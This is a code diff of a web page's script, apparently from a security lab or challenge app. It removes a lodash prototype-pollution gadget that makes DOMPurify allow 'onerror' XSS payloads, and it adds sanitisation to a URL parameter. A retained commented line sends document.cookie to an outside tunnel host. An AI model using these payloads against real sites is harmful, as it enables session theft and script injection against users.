@@ -154,18 +154,6 @@
         <script>
             additionalInfo = {};
 
-            // function report(userDefinedUrl) {                
-            //     fetch(`/report?url=${document.location.href}`)
-            //         .then(response => response.json())
-            //         .then(data => {
-            //             console.log(data);
-            //         })
-            //         .catch(error => {
-            //             console.error('Error:', error);
-            //         });
-            // }
-
-
             function report(userDefinedUrl) {
                 fetch('/report', {
                     method: 'POST',
@@ -223,29 +211,6 @@
                 
             }
 
-
-            function set_vuln(){
-                                
-
-                lod = _.set({}, "__proto__[hasOwnProperty]", "{}");
-                lod = _.set({}, "__proto__[ALLOWED_ATTR][0]",'onerror');
-                lod = _.set({}, "__proto__[ALLOWED_ATTR][1]",'src');
-                // document.getElementById("content").innerHTML += (DOMPurify.sanitize('<img src onerror=alert(1)>'));
-
-                // console.log(Object.prototype);                
-                // Object.prototype.hasOwnProperty = Object;
-                // Object.prototype.ALLOWED_ATTR = ['onerror', 'src']       
-                console.log(Object.prototype);                                         
-                // console.log('<button formaction=javascript:alert(1)>'); 
-                // console.log('<animate onbegin=alert(1) attributeName=x dur=1s>');
-                console.log(DOMPurify.sanitize('<img src onerror=alert(1)>'));
-                document.getElementById("content").innerHTML += (DOMPurify.sanitize('<img src onerror=alert(1)>'));
-
-                // document.getElementById("content").innerHTML += (DOMPurify.sanitize('<animate onbegin=alert(1) attributeName=x dur=1s>'));
-            }
-
-            
-
             // Run the function when the DOM is fully loaded (i.e. when the '/' page is visited)
             document.addEventListener("DOMContentLoaded", 
             function(){
@@ -263,8 +228,6 @@
                 console.log('additionalInfo: ', additionalInfo);
                 
                 if(urlParams.has('name')){
-                    console.log('before purified: ', '<p>' + 'name: ' + urlParams.get('name') + '</p>');
-                    // name = DOMPurify.sanitize('<p>' + 'name: ' + urlParams.get('name') + '</p>');
                     name = ('<p>' + 'name: ' + urlParams.get('name') + '</p>');
                     console.log('name purified: ', name);
                     // document.getElementById("content").innerHTML += DOMPurify.sanitize(`<img src=https://home-cornwall-zum-folks.trycloudflare.com?${encodeURIComponent(document.cookie)}>`);
@@ -275,7 +238,8 @@
                     // const tempDiv = document.createElement('div');
                     // tempDiv.innerHTML = rawHTML;
                     // content.appendChild(tempDiv.firstChild); // Append the parsed HTML element
-                    document.getElementById("content").innerHTML += '<p>' + 'name: ' + urlParams.get('name') + '</p>';
+                    console.log('DOMPurified element: ', DOMPurify.sanitize('<p>' + 'name: ' + urlParams.get('name') + '</p>'));
+                    document.getElementById("content").innerHTML += DOMPurify.sanitize('<p>' + 'name: ' + urlParams.get('name') + '</p>');
                     // document.getElementById("content").innerHTML += rawHtml;
                 }
                 if(urlParams.has('age')){
